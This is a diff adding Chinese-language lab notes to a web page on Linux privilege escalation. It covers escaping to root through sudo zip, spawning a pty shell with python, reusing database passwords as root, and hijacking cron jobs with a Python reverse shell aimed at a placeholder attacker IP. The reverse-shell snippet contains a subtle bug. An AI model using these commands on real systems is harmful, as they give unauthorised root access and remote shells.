@@ -266,7 +266,14 @@
 
   <div class="article-content">
     <div class="markdown-body">
-      
+      <p>##<strong>补充</strong><br>###1、利用zip提权</p>
+<p>使用sudo -l 查看当前用户可以使用的root提权命令信息，发现可以执行tar和zip相关命令。<br>touch exploit<br>sudo -u root zip exploit.zip exploit -T –unzip-command=”sh -c /bin/bash”</p>
+<p>###2、密码复用补充<br>管理员可能会设置重复使用的密码，因此可能数据库或者web后台的密码就是root密码</p>
+<p>拥有疑似root的秘密可以尝试ssh登录，若禁止root登录或被防火墙挡住，我们就想办法在低权限上输入密码，当然一般情况下linux会要求用户必须从终端设备（tty）中输入密码，禁止标准输入，sudo常常不能使用<br>因此我们可以用python模拟一个终端  python -c “import pty;pty.spawn(‘/bin/bash’)”</p>
+<p>###3、利用定时计划任务<br>通过查看 /etc/crontab 文件，查看其他用户是否有设定的系统定时任务，并查看对应对应任务内容，执行的任务肯定时对靶场机器的某个文件。</p>
+<p>/etc/crontab 文件是用来设定系统定期执行任务，需要root权限，不同用户都可以有不同定时任务，如果在 /etc/crontab 下有某个用户执行的定时计划文件，但是具体目录下没有这个定时执行的文件，可以自行创建反弹shell ，用创建的脚本替换原来的py脚本，netcat执行监听获得对应用户的权限</p>
+<p>如果有定时执行任务的文件，可以切换到对应的目录，查看对应的权限，查看当前用户是否具有读写权限</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,subprocess,socket</span><br><span class="line"> </span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">"攻击机ip地址"</span>,<span class="string">"攻击机监听端口"</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess([<span class="string">"/bin/sh"</span>,<span class="string">"-i "</span>])</span><br></pre></td></tr></table></figure>
     </div>
   </div>
   
